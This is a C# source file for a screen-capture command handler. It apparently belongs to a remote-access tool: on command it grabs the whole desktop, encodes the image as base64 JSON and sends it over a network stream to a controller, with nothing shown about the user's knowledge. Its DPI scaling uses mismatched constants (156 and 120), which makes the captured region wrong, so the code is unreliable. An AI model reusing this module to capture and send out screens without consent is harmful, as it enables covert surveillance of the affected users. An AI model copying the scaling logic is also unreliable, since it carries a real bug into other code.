using Newtonsoft.Json;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;

namespace ChildProcess
{
    public class ScreenCapture : ICommandHandler
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetDesktopWindow();

        [StructLayout(LayoutKind.Sequential)]
        private struct Rect
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);

        public static Image CaptureDesktop()
        {
            return CaptureWindow(GetDesktopWindow());
        }

        public static Bitmap CaptureActiveWindow()
        {
            return CaptureWindow(GetForegroundWindow());
        }

        public static Bitmap CaptureWindow(IntPtr handle)
        {
            var rect = new Rect();
            GetWindowRect(handle, ref rect);
            int width = rect.Right - rect.Left;
            int height = rect.Bottom - rect.Top;

            using (var graphics = Graphics.FromHwnd(handle))
            {
                float dpiX = graphics.DpiX;
                float dpiY = graphics.DpiY;

                width = (int)(width * 156 / dpiX);
                height = (int)(height * 120 / dpiY);
            }

            var bounds = new Rectangle(rect.Left, rect.Top, width, height);
            var result = new Bitmap(bounds.Width, bounds.Height);

            using (var graphics = Graphics.FromImage(result))
            {
                graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
            }

            return result;
        }

        public void HandleCommand(Communication stream)
        {
            // Convert captured image to base64 string
            Image capturedImage = ScreenCapture.CaptureDesktop();
            string base64Image = ImageToBase64(capturedImage);

            var jsonData = new { 
                Image = base64Image,
                FeatureName = "ScreenCapture"
            };

            string jsonString = JsonConvert.SerializeObject(jsonData, Formatting.Indented);
            Console.WriteLine(jsonString);


            // Then send the data
            stream.Send(jsonString);
        }

        // Method to convert Image to base64 string
        private string ImageToBase64(Image image)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                image.Save(ms, ImageFormat.Png);
                byte[] imageBytes = ms.ToArray();
                return Convert.ToBase64String(imageBytes);
            }
        }

    }
}
